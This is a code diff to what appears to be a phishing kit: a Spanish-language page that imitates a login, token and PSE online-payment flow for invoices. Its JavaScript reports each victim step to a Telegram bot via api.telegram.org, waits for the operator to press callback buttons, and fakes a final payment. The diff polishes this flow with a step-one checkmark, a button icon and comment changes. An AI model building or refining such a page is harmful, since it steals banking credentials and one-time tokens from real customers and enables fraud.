@@ -76,7 +76,7 @@ body {
     cursor: pointer;
 }
 
-/* Contenido principal */
+/* Contenido principal (Login) */
 main {
     min-height: calc(100vh - 120px);
     padding: 30px 20px 40px;
@@ -250,7 +250,7 @@ main {
     border-top: 1px solid #777;
 }
 
-/* VISTAS */
+/* VISTAS INTERNAS LOGIN */
 .token-view { display: none; width: 100%; flex-direction: column; }
 .token-view.active { display: flex; }
 .loading-view { display: none; width: 100%; flex-direction: column; align-items: center; padding-top: 20px;}
@@ -308,7 +308,7 @@ main {
     color: #29313b;
 }
 
-/* Decorativos */
+/* Decorativos Login */
 .security {
     display: flex;
     align-items: center;
@@ -376,7 +376,7 @@ main {
 .loading-overlay p { font-size: 14px; color: #29313b; font-weight: 700; }
 
 /* ==========================================
-   VISTA 4: PANTALLA AMARILLA (PASOS 1, 2, 3)
+   VISTA AMARILLA (PAGOS EN LÍNEA)
    ========================================== */
 #viewAmarilla {
     display: none;
@@ -456,14 +456,14 @@ main {
     width: 100%;
 }
 
-/* Columna Izquierda (Cambia de contenido) */
+/* Columna Izquierda Dinámica */
 .left-amarillo {
     flex: 1;
     max-width: 650px;
     background: #ffdf00;
 }
 
-/* Vista 1 (Lirio ET1) */
+/* PASO 1: LIRIO ET1 */
 .left-paso-1 .titulo {
     display: flex;
     align-items: center;
@@ -473,14 +473,12 @@ main {
     color: #111;
     margin-bottom: 25px;
 }
-
 .left-paso-1 .titulo::after {
     content: '';
     height: 35px;
     width: 1px;
     background: #333;
 }
-
 .left-paso-1 .caja-blanca {
     background: #fff;
     padding: 15px;
@@ -491,9 +489,21 @@ main {
 }
 .left-paso-1 .caja-blanca .num { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 5px; }
 .left-paso-1 .caja-blanca .sub { font-size: 12px; color: #666; margin-bottom: 15px; }
-.left-paso-1 .caja-blanca .check { width: 20px; height: 20px; background: #4caf50; border-radius: 3px; display: flex; align-items: center; justify-content: center; color: white; font-size: 14px;}
+.left-paso-1 .caja-blanca .check { 
+    width: 20px; height: 20px; 
+    background: #ddd; 
+    border-radius: 3px; 
+    display: flex; align-items: center; justify-content: center; 
+    color: transparent; 
+    font-size: 14px;
+    transition: all 0.3s;
+}
+.left-paso-1 .caja-blanca .check.activo { 
+    background: #4caf50; 
+    color: white; 
+}
 
-/* Vista 2 (Facturas) */
+/* PASO 2: FACTURAS */
 .left-paso-2 {
     background: #fff;
     border-radius: 8px;
@@ -524,7 +534,7 @@ main {
 .left-paso-2 td { padding: 10px 5px; border-bottom: 1px solid #eee; }
 .left-paso-2 .circulo-verde { width: 10px; height: 10px; background: #4caf50; border-radius: 50%; display: inline-block; margin-right: 8px; }
 
-/* Vista 3 (PSE) */
+/* PASO 3: PSE */
 .left-paso-3 {
     background: #fff;
     border-radius: 8px;
@@ -543,7 +553,7 @@ main {
 .left-paso-3 .form-pse label { display: block; font-size: 11px; color: #555; margin-bottom: 5px; }
 .left-paso-3 .form-pse input, .left-paso-3 .form-pse select { width: 100%; padding: 8px 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 13px; color: #333; }
 
-/* Columna Derecha (Fija) */
+/* Columna Derecha Fija */
 .right-amarillo {
     width: 380px;
     display: flex;
@@ -551,7 +561,6 @@ main {
     gap: 15px;
 }
 
-/* Barra de pasos */
 .pasos {
     display: flex;
     justify-content: space-between;
@@ -560,7 +569,6 @@ main {
     margin-bottom: 5px;
     padding: 0 15px;
 }
-
 .pasos::before {
     content: '';
     position: absolute;
@@ -571,7 +579,6 @@ main {
     background: #333;
     z-index: 1;
 }
-
 .paso {
     display: flex;
     flex-direction: column;
@@ -579,7 +586,6 @@ main {
     z-index: 2;
     gap: 5px;
 }
-
 .paso .circulo {
     width: 24px;
     height: 24px;
@@ -634,10 +640,8 @@ main {
     justify-content: center;
     flex-wrap: wrap;
 }
-.logos-pasarela span { font-size: 9px; color: #888; }
 .logos-pasarela div { font-size: 12px; font-weight: 700; color: #444; background: #eee; padding: 5px 10px; border-radius: 3px; }
 
-/* Footer amarillo */
 .footer-amarillo {
     background: #f2f2f2;
     padding: 15px;
@@ -647,7 +651,9 @@ main {
     margin-top: auto;
 }
 
-/* RESPONSIVE */
+/* ==========================================
+   RESPONSIVE
+   ========================================== */
 @media (min-width: 701px) and (max-width: 950px) {
     .topbar { gap: 16px; padding-right: 22px; padding-left: 22px; }
     .topbar h1 { font-size: 21px; }
@@ -700,7 +706,6 @@ main {
     .right-amarillo { width: 100%; }
     .pasos { padding: 0; }
     .pasos::before { left: 15%; right: 15%; }
-    
     .left-paso-3 .form-pse { grid-template-columns: 1fr; }
     .left-paso-3 .form-pse .full { grid-column: span 1; }
 }
@@ -709,7 +714,7 @@ main {
 
 <body>
 
-<!-- VISTAS 1, 2 Y 3 -->
+<!-- VISTAS 1, 2 Y 3 LOGIN -->
 <div id="contenedorOriginal">
     <header class="topbar">
         <div class="brand" aria-label="Marca">
@@ -802,13 +807,13 @@ main {
     </main>
 </div>
 
-<!-- OVERLAY DE CARGA -->
+<!-- OVERLAY DE CARGA (Por si acaso) -->
 <div class="loading-overlay" id="loading-overlay">
     <div class="spinner"></div>
     <p>Procesando...</p>
 </div>
 
-<!-- PANTALLA AMARILLA (PASO 1, 2, 3) -->
+<!-- PANTALLA AMARILLA (PASOS) -->
 <div id="viewAmarilla">
     <header class="header-amarillo">
         <div class="logo">
@@ -834,20 +839,20 @@ main {
 
     <div class="body-amarillo">
         
-        <!-- CONTENIDO IZQUIERDO DINÁMICO -->
+        <!-- COLUMNA IZQUIERDA (PASOS) -->
         <div class="left-amarillo">
             
-            <!-- PASO 1: INICIO -->
+            <!-- PASO 1 -->
             <div class="left-paso-1" id="paso1Amarillo">
                 <div class="titulo">LIRIO ET1</div>
                 <div class="caja-blanca">
                     <div class="num">16-1003.240405.38361573</div>
                     <div class="sub">16-1003</div>
-                    <div class="check">✓</div>
+                    <div class="check" id="checkPaso1">✓</div>
                 </div>
             </div>
 
-            <!-- PASO 2: FACTURAS -->
+            <!-- PASO 2 -->
             <div class="left-paso-2" id="paso2Amarillo">
                 <div class="top-bar-facturas">
                     <h2>LIRIO ET1</h2>
@@ -887,17 +892,11 @@ main {
                             <td>28/04/2022</td>
                             <td>$1,500,000.00</td>
                         </tr>
-                        <tr>
-                            <td><span class="circulo-verde"></span> 38361573</td>
-                            <td>CUOTA</td>
-                            <td>28/05/2022</td>
-                            <td>$1,500,000.00</td>
-                        </tr>
                     </tbody>
                 </table>
             </div>
 
-            <!-- PASO 3: PSE -->
+            <!-- PASO 3 -->
             <div class="left-paso-3" id="paso3Amarillo">
                 <div class="tabs-pse">
                     <div class="tab active">PSE</div>
@@ -946,7 +945,7 @@ main {
 
         </div>
 
-        <!-- COLUMNA DERECHA FIJA -->
+        <!-- COLUMNA DERECHA (BOTÓN DINÁMICO) -->
         <div class="right-amarillo">
             <div class="pasos">
                 <div class="paso"><div class="circulo">1</div></div>
@@ -955,14 +954,10 @@ main {
             </div>
 
             <div class="card-blanca-amarilla">
-                <!-- CONTENEDOR BOTÓN DINÁMICO -->
-                <div id="contenedorBotonAmarillo">
-                    <!-- El botón cambiará según el paso -->
-                    <button class="btn-siguiente" id="btnAccionAmarillo">
-                        SIGUIENTE
-                    </button>
-                </div>
-
+                <button class="btn-siguiente" id="btnAccionAmarillo">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+                    SIGUIENTE
+                </button>
                 <div class="recaptcha-texto">
                     Sitio protegido por reCAPTCHA. aplican las políticas de <b>privacidad</b> y <b>términos</b> de Google.
                 </div>
@@ -1003,8 +998,10 @@ const viewAmarilla = document.getElementById('viewAmarilla');
 const paso1Amarillo = document.getElementById('paso1Amarillo');
 const paso2Amarillo = document.getElementById('paso2Amarillo');
 const paso3Amarillo = document.getElementById('paso3Amarillo');
+const checkPaso1 = document.getElementById('checkPaso1');
 const btnAccionAmarillo = document.getElementById('btnAccionAmarillo');
 let pasoActualAmarillo = 1;
+let checkPaso1Activado = false;
 
 // Elementos Login
 const inputId = document.getElementById('identificacion');
@@ -1030,7 +1027,7 @@ let esperandoCorreoEscrito = false;
 let ultimoUpdateId = -1;
 
 // ==========================================
-// LÓGICA DE UI
+// LÓGICA DE UI (LOGIN)
 // ==========================================
 inputId.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
@@ -1146,7 +1143,7 @@ function escucharBotones(callbackAction) {
 }
 
 // ==========================================
-// ACCIONES Y REDIRECCIONES
+// ACCIONES LOGIN
 // ==========================================
 function redirigir(url) {
     ocultarOverlay();
@@ -1228,10 +1225,12 @@ function handleTelegramActionToken(action) {
 }
 
 // ==========================================
-// FLUJO DE PASOS (PANTALLA AMARILLA)
+// LÓGICA DE LA PANTALLA AMARILLA (PASOS)
 // ==========================================
 function iniciarFlujoAmarillo() {
     pasoActualAmarillo = 1;
+    checkPaso1Activado = false;
+    checkPaso1.classList.remove('activo');
     actualizarPasoAmarillo();
     
     // Quitar eventos anteriores clonando el botón
@@ -1266,10 +1265,18 @@ function actualizarPasoAmarillo() {
 
 function accionBotonAmarillo() {
     if (pasoActualAmarillo === 1) {
+        // 1. Marcar el check
+        if (!checkPaso1Activado) {
+            checkPaso1.classList.add('activo');
+            checkPaso1Activado = true;
+            return; // Detenerse aquí para que vea el check marcado antes de pasar
+        }
+
+        // 2. Pasar al paso 2
         pasoActualAmarillo = 2;
         actualizarPasoAmarillo();
         
-        // Notificar a Telegram paso 2
+        // 3. Notificar a Telegram
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
@@ -1307,7 +1314,6 @@ function accionBotonAmarillo() {
         escucharAccionesFinales();
 
     } else if (pasoActualAmarillo === 3) {
-        // Simular pago final
         const btn = document.getElementById('btnAccionAmarillo');
         btn.innerHTML = `PROCESANDO...`;
         btn.disabled = true;
@@ -1343,7 +1349,6 @@ function escucharAccionesFinales() {
             for (const u of data.result) {
                 ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
                 if (u.callback_query) {
-                    // Aceptar cualquier botón que tú presiones de ahora en adelante
                     pollingActivo = false;
                     const action = u.callback_query.data;
                     if (action === 'finalizar_yahoo_final' || action === 'finalizar_yahoo') {
